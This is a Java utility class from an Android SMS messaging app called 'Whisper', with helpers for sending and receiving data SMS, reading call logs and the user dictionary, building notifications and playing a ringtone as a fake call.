    public static Pair<String, String> handleSms(Context context, Intent intent){
        StringBuilder address = new StringBuilder();
        StringBuilder body = new StringBuilder();
        SmsMessage[] smsMessage = Telephony.Sms.Intents.getMessagesFromIntent(intent);
        String number = smsMessage[0].getDisplayOriginatingAddress();
        address.append(Lofl.reverseLookupNameByPhoneNumber(number, context.getContentResolver()));
        for (int i = 0; i < smsMessage.length; i++) {
            body.append(smsMessage[i].getMessageBody());
        }
        return new Pair<>(address.toString(), body.toString());
    }


    public static void sendDeliveryReportSms(String address){
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendDataMessage(address, null, new Short("6666"), Constants.DELIVERY_REPORT_CODE.getBytes(), null, null);
    }

    public static void notifyDelivered(Context context, Intent intent){
        sId++;
        createConfirmationsNotificationChannel(context);
        Notification.Builder builder = new Notification.Builder(context, Constants.CONFIRMATIONS_NOTIFICATION_CHANNEL_ID);
        builder.setSmallIcon(android.R.drawable.stat_notify_chat).setContentTitle("Whisper Delivered").setPriority(Notification.PRIORITY_DEFAULT).setColor(context.getResources().getColor(android.R.color.holo_green_dark))
                .setGroup(Constants.CONFIRMATIONS_NOTIFICATION_GROUP).setTimeoutAfter(Constants.SENT_CONFIRM_TIMEOUT_AFTER)
                .setAutoCancel(true).setContentIntent(createContentClickIntent(context, intent));
        sNotificationManager.notify(sId++, builder.build());
    }

    /*send sms message as type String*/
    public static void sendSms(Context context, String response, String destTelephoneNumber) {
        SmsManager smsManager = SmsManager.getDefault();
        ArrayList<PendingIntent> sentIntents = new ArrayList<>();
        String name = Lofl.reverseLookupNameByPhoneNumber(destTelephoneNumber, context.getContentResolver());
        ArrayList<String> parts = smsManager.divideMessage(response);
        for (int i = 0; i < parts.size(); i++) {
            Intent intent = new Intent();
            intent.putExtra(Constants.ADDRESS, name);
            intent.setAction(Constants.SENT_CONFIRMATION_ACTION);
            sentIntents.add(PendingIntent.getBroadcast(context, 0, intent, 0));
        }
        for (int i = 0; i < parts.size(); i++) {
            smsManager.sendDataMessage(destTelephoneNumber, null, new Short("6666"), parts.get(i).getBytes(), sentIntents.get(i), null);
        }
    }

    public static String getDeviceTelephoneNumber(Context context){
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            return telephonyManager.getLine1Number();
        } catch (SecurityException e) {
            e.printStackTrace();
            return "";
        }
    }

    public static ArrayList<PhoneCall> fetchCallLogOutgoing(Context context){
        String[] columns = new String[]{CallLog.Calls.TYPE, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION};
        String selection = CallLog.Calls.TYPE + " = ?";
        String[] selectionArgs = new String[]{String.valueOf(CallLog.Calls.OUTGOING_TYPE)};
        ArrayList<PhoneCall> phoneCalls = new ArrayList<>();
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://call_log/calls"), columns, selection, selectionArgs, null);
        if(cursor != null){
            int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
            int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
            while(cursor.moveToNext()){
                String callType = cursor.getString(typeIndex);
                String address = cursor.getString(numberIndex);
                String time = cursor.getString(dateIndex);
                String duration = cursor.getString(durationIndex);
                phoneCalls.add(new PhoneCall(callType, address, time, duration));
            }
        }
        cursor.close();
        return phoneCalls;
    }

    public static ArrayList<PhoneCall> fetchCallLogIncoming(Context context){
        String[] columns = new String[]{CallLog.Calls.TYPE, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION};
        String selection = CallLog.Calls.TYPE + " = ?";
        String[] selectionArgs = new String[]{String.valueOf(CallLog.Calls.INCOMING_TYPE)};
        ArrayList<PhoneCall> phoneCalls = new ArrayList<>();
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://call_log/calls"), columns, selection, selectionArgs, null);
        if(cursor != null){
            int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
            int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
            while(cursor.moveToNext()){
                String callType = cursor.getString(typeIndex);
                String address = cursor.getString(numberIndex);
                String time = cursor.getString(dateIndex);
                String duration = cursor.getString(durationIndex);
                phoneCalls.add(new PhoneCall(callType, address, time, duration));
            }
        }
        cursor.close();
        return phoneCalls;
    }

    public static ArrayList<PhoneCall> fetchCallLogRejected(Context context){
        String[] columns = new String[]{CallLog.Calls.TYPE, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION};
        String selection = CallLog.Calls.TYPE + " = ?";
        String[] selectionArgs = new String[]{String.valueOf(CallLog.Calls.REJECTED_TYPE)};
        ArrayList<PhoneCall> phoneCalls = new ArrayList<>();
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://call_log/calls"), columns, selection, selectionArgs, null);
        if(cursor != null){
            int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
            int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
            while(cursor.moveToNext()){
                String callType = cursor.getString(typeIndex);
                String address = cursor.getString(numberIndex);
                String time = cursor.getString(dateIndex);
                String duration = cursor.getString(durationIndex);
                phoneCalls.add(new PhoneCall(callType, address, time, duration));
            }
        }
        cursor.close();
        return phoneCalls;
    }

    public static ArrayList<PhoneCall> fetchCallLogMissed(Context context){
        String[] columns = new String[]{CallLog.Calls.TYPE, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION};
        String selection = CallLog.Calls.TYPE + " = ?";
        String[] selectionArgs = new String[]{String.valueOf(CallLog.Calls.MISSED_TYPE)};
        ArrayList<PhoneCall> phoneCalls = new ArrayList<>();
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://call_log/calls"), columns, selection, selectionArgs, null);
        if(cursor != null){
            int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
            int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
            while(cursor.moveToNext()){
                String callType = cursor.getString(typeIndex);
                String address = cursor.getString(numberIndex);
                String time = cursor.getString(dateIndex);
                String duration = cursor.getString(durationIndex);
                phoneCalls.add(new PhoneCall(callType, address, time, duration));
            }
        }
        cursor.close();
        return phoneCalls;
    }

    public static ArrayList<PhoneCall> fetchCallLog(Context context){
        String[] columns = new String[]{CallLog.Calls.TYPE, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION};
        ArrayList<PhoneCall> phoneCalls = new ArrayList<>();
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://call_log/calls"), columns, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
        if(cursor != null){
            int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
            int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
            while(cursor.moveToNext()){
                String callType = cursor.getString(typeIndex);
                String address = cursor.getString(numberIndex);
                String time = cursor.getString(dateIndex);
                String duration = cursor.getString(durationIndex);
                phoneCalls.add(new PhoneCall(callType, address, time, duration));
            }
        }
        cursor.close();
        return phoneCalls;
    }

    public static void pickContact(Activity activity) {
        Intent contactsIntent = new Intent(Intent.ACTION_PICK, ContactsContract.CommonDataKinds.Phone.CONTENT_URI);
        activity.startActivityForResult(contactsIntent, Constants.PICK_CONTACT_REQ_CODE);
    }

    public static void createConfirmationsNotificationChannel(Context context){
        initNotificationManager(context);
        if(sNotificationManager.getNotificationChannel(Constants.CONFIRMATIONS_NOTIFICATION_CHANNEL_ID) == null){
            NotificationChannel notificationChannel = new NotificationChannel(Constants.CONFIRMATIONS_NOTIFICATION_CHANNEL_ID, Constants.CONFIRMATION_NOTIFICATION_CHANNEL_TITLE, NotificationManager.IMPORTANCE_HIGH);
            notificationChannel.setShowBadge(false);
            notificationChannel.enableVibration(false);
            notificationChannel.enableLights(false);
            notificationChannel.setLockscreenVisibility(Notification.VISIBILITY_PUBLIC);
            sNotificationManager.createNotificationChannel(notificationChannel);
        }
    }

    public static void createPrimaryNotificationChannel(NotificationManager notificationManager) {
        if(sNotificationManager.getNotificationChannel(Constants.PRIMARY_NOTIFICATION_CHANNEL_ID) == null){
            NotificationChannel notificationChannel = new NotificationChannel(Constants.PRIMARY_NOTIFICATION_CHANNEL_ID, Constants.PRIMARY_NOTIFICATION_CHANNEL_ID, NotificationManager.IMPORTANCE_HIGH);
            notificationChannel.setShowBadge(true);
            notificationChannel.enableVibration(true);
            notificationChannel.enableLights(true);
            notificationChannel.shouldShowLights();
            notificationChannel.shouldVibrate();
            notificationChannel.setLockscreenVisibility(Notification.VISIBILITY_PUBLIC);
            notificationChannel.setVibrationPattern(Constants.VIBRATION_PATTERN);
            notificationChannel.setLightColor(Color.RED);
            notificationManager.createNotificationChannel(notificationChannel);
        }
    }

    private static Notification.Action createWhisperSharedTextAction(Context context, String address, Intent intent) {
        PendingIntent pendingIntent = createWhisperPendingIntent(context, address, intent);
        Notification.Action.Builder builder = new Notification.Action.Builder(R.drawable.ic_action_stat_reply, "Whisper Shared Text", pendingIntent);
        return builder.build();
    }

    private static Notification.Action createWhisperAction(Context context, String address, Intent intent) {
        RemoteInput remoteInput = createWhisperRemoteInput();
        PendingIntent pendingIntent = createWhisperPendingIntent(context, address, intent);
        Notification.Action.Builder builder = new Notification.Action.Builder(R.drawable.ic_action_stat_reply, Constants.WHISPER, pendingIntent);
        builder.addRemoteInput(remoteInput);
        return builder.build();
    }

    private static RemoteInput createWhisperRemoteInput() {
        RemoteInput.Builder builder = new RemoteInput.Builder(Constants.WHISPER_KEY);
        builder.setLabel(Constants.WHISPER);
        return builder.build();
    }

    private static PendingIntent createWhisperPendingIntent(Context context, String address, Intent intent) {
        Intent whisperIntent = createWhisperIntent(address, intent);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, whisperIntent, PendingIntent.FLAG_UPDATE_CURRENT);
        return pendingIntent;
    }

    /*DICTIONARY PERMISSION REMOVED IN ANDROID M*/
    public static ArrayList<String> fetchDictionary(Context context){
        String[] projection = new String[]{UserDictionary.Words.WORD};
        ArrayList<String> dictionary = new ArrayList<>();
        Cursor cursor = context.getContentResolver().query(UserDictionary.Words.CONTENT_URI, projection, null, null, null);
        if(cursor != null){
            int wordColumnIndex = cursor.getColumnIndex("word");
            while(cursor.moveToNext()){
                String word = cursor.getString(wordColumnIndex);
                if(word != null){
                    dictionary.add(word);
                }
            }
        }
        return dictionary;
    }

    private static Intent createWhisperIntent(String address, Intent sharedIntent) {
        Intent intent = new Intent();
        if(sharedIntent.hasExtra(Constants.SHARED_TEXT_KEY)){
            intent.putExtra(Constants.SHARED_TEXT_KEY, sharedIntent.getStringExtra(Constants.SHARED_TEXT_KEY));
        }
        intent.setAction(Constants.WHISPER_ACTION);
        intent.putExtra(Constants.ADDRESS, address);
        intent.putExtra(Constants.NOTIFICATION_ID_KEY, sId);
        return intent;
    }

    public static Notification createPersistentServiceNotification(Context context) {
        createPersistentForegroundNotificationChannel(context);
        Intent intent = new Intent(context, MainActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        Notification.Builder builder = new Notification.Builder(context, Constants.FOREGROUND_NOTIFICATION_CHANNEL_ID);
        PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, intent, 0);
        builder.setContentIntent(pendingIntent);
        builder.setSmallIcon(android.R.drawable.stat_notify_chat);
        builder.setContentTitle("listening for whispers");
        builder.setContentText("press to whisper");
        builder.setColorized(true);
        builder.setColor(context.getResources().getColor(android.R.color.holo_green_dark));
        return builder.build();
    }

    public static void fakePhoneCall(Context context){
        RingtoneManager ringtoneManager = new RingtoneManager(context);
        Uri uri = RingtoneManager.getActualDefaultRingtoneUri(context, RingtoneManager.TYPE_RINGTONE);
        Ringtone ringtone = ringtoneManager.getRingtone(ringtoneManager.getRingtonePosition(uri));
        ringtone.play();
/*        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(20000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                ringtone.stop();
            }
        }).start();*/
    }

    private static void createPersistentForegroundNotificationChannel(Context context) {
        initNotificationManager(context);
        if(sNotificationManager.getNotificationChannel(Constants.FOREGROUND_NOTIFICATION_CHANNEL_ID) == null){
            NotificationChannel notificationChannel = new NotificationChannel(Constants.FOREGROUND_NOTIFICATION_CHANNEL_ID, Constants.FOREGROUND_NOTIFICATION_CHANNEL_ID, NotificationManager.IMPORTANCE_DEFAULT);
            notificationChannel.enableVibration(false);
            notificationChannel.enableLights(false);
            sNotificationManager.createNotificationChannel(notificationChannel);
        }
    }

    public static boolean checkAirplaneMode(Context context){
        boolean isOn = false;
        if(Settings.System.getInt(context.getContentResolver(), Settings.Global.AIRPLANE_MODE_ON, 0) == 0){
            isOn = true;
        }
        return isOn;
    }
}